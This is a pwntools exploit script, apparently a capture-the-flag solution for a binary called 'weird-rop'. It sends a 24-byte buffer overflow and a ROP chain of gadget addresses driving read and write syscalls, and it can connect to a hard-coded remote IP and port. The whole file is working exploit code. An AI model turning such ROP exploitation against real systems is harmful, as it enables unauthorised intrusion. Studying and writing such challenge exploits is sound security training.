#!/usr/bin/env python2
from pwn import *

exe = ELF("./weird-rop")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
IP, PORT = "35.224.135.84", 1000

global io
breakpoints = '''
break vuln
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

rax_1 = 0x40100a
rax_0 = 0x401002

pop_rdx = 0x4010de

rdi_314 = 0x40105c
rdi_30c = 0x401044
rdi_1d = 0x401089
rdi_1 = 0x401012

syscall = 0x4010db

rl()

payload = "A"*24
payload += flat([
    rdi_314, rdi_30c,
    rdi_1d,  # rdi->0x5
    rax_0,
    pop_rdx, 0x20,
    syscall,

    rdi_1,
    rax_1,
    syscall
    ])

sl(payload)

io.interactive()
